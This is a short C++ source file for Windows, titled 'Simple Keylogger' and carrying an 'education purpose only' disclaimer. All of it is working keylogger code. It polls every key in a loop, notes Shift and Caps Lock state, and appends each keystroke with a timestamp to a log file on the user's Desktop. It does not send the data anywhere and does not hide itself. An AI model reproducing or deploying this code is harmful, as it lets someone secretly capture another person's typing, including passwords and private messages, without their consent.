/**
By: kaizenNakamoto
Simple Keylogger
DISCLAIMER : FOR EDUCATION PURPOSE ONLY, NOT TO BE USED FOR MALLICIOUS ACTIVITIES
**/
#include<iostream>
#include<windows.h>
#include<fstream>
#include<string>
#include<time.h>
using namespace std;

char special[13]={',','.',';','\\','[',']','-','=','e','`','b','t','/'};
int vals[13]={188,190,186,222,219,221,189,187,13,192,8,9,191};

const string currentDateTime() {
    time_t     now = time(0);
    struct tm  tstruct;
    char       buf[80];
    tstruct = *localtime(&now);
    strftime(buf, sizeof(buf), "%Y-%m-%d.%X", &tstruct);

    return buf;
}
string get_caps(){
//if(GetAsyncKeyState(VK_CAPITAL)&0x8000)
    if(GetKeyState(VK_CAPITAL)&0x8000!=0)
        return "CAPS_ON";
    else   return "CAPS_OFF";
}
bool get_shift(){
if(((GetKeyState(VK_LSHIFT)&0x8000)!=0) || ((GetKeyState(VK_RSHIFT)&0x8000)!=0))
return 1;
else
    return 0;
}
int main(){

ofstream logger;
logger.open("C:\\Users\\kiran\\Desktop\\logger.txt",ios::app);

logger<<"-------------------------------------------------------------------------"<<endl;
logger<<currentDateTime()<<endl<<endl<<endl;
logger<<get_caps()<<endl;
while(1){
        if((GetAsyncKeyState(VK_CAPITAL)&0x8000)!=0){
                    logger<<get_caps()<<endl;
                    while((GetAsyncKeyState(VK_CAPITAL)&0x8000)!=0);}
        else{
            for(int i=0;i<13;i++){
            if((GetAsyncKeyState(vals[i])&0x8000)!=0){
                if(get_shift())
                                logger<<"Shift "<<special[i]<<endl;
                                else
                                logger<<special[i]<<endl;

                                while((GetAsyncKeyState(vals[i])&0x8000)!=0);
            }
        }

            for(int i=32;i<=127;i++){
                int val=GetAsyncKeyState(i);
                    if((val&0x8000)!=0)//press code
                        {
                                if(get_shift())
                                logger<<"Shift "<<(char)i<<endl;
                                else
                                logger<<(char)i<<endl;

                                while((GetAsyncKeyState(i)&0x8000)!=0);

                        }
            }
        }
}
return 0;
}
